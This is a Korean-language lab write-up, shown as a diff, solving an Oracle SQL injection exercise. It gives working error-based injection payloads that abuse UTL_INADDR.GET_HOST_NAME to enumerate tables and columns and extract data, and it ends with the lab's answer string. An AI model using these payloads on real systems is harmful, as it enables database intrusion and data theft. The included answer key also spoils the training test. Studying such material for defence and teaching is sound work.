@@ -1,0 +1,65 @@
+=======================================
+
+* SQL Injection Oracle 문제 6번
+
+=======================================
+
+1. 풀이과정 
+
+ 1) 쿼리문 유추
+
+select * from 게시판 where 제목 like '%__검색어__%'
+
+
+
+ 2) 공격포인트
+
+검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME('eqst') and 'k%'='k
+검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME((select user from dual)) and 'k%'='k
+
+ORA-29257: host SKINFOSEC7 unknown
+
+
+ 3) 에러 제약사항 
+
+UTL_INADDR.GET_HOST_NAME((서브쿼리))
+UTL_INADDR.GET_HOST_ADDRESS((서브쿼리))
+ORDSYS.ORD_DICOM.GETMAPPINGXPATH((서브쿼리, user, user))
+
+ 4) 테이블명 
+
+ select table_name from user_tables 
+ 4-1. 개수: 6개
+  select table_name from user_tables  
+  select count(table_name) from user_tables 
+
+검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME(__공격쿼리__) and 'k%'='k
+검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME((select count(table_name) from user_tables)) and 'k%'='k
+ORA-29257: host 6 unknown
+
+ 4-2. 테이블명 1 row씩 : 5번째 열이 EQST_ANSWER을 확인
+ select a from (select table_name a, rownum b from user_tables) where b = 1~6
+
+ 5) 컬럼명
+
+select column_name from cols where table_name = 'EQST_ANSWER'
+  5-1. 개수: 5
+  select count(column_name) from cols where table_name = 'EQST_ANSWER'
+  검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME(__공격쿼리__) and 'k%'='k
+  검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME((select count(column_name) from cols where table_name = 'EQST_ANSWER')) and 'k%'='k
+
+ORA-29257: host 5 unknown
+  5-2. 컬럼 1 row씩: ANSWER_COLUMN, REG_DT,REG_ACCT_ID,UDT_DT,UDT_ACCT_ID
+  select column_name from (select column_name, rownum w from cols where table_name = 'EQST_ANSWER') where w=1 ~ 개수 
+  검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME(__공격쿼리__) and 'k%'='k
+  검색어: hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME((select column_name from (select column_name, rownum w from cols where table_name = 'EQST_ANSWER') where w=1)) and 'k%'='k
+
+ 6) 데이터 탈취 
+
+ SELECT ANSWER_COLUMN FROM EQST_ANSWER;
+ hi%' and 'qwe'=UTL_INADDR.GET_HOST_NAME((SELECT ANSWER_COLUMN FROM EQST_ANSWER)) and 'k%'='k
+
+2. 정답
+skinfosec_eqst_lms_system
+=======================================
+
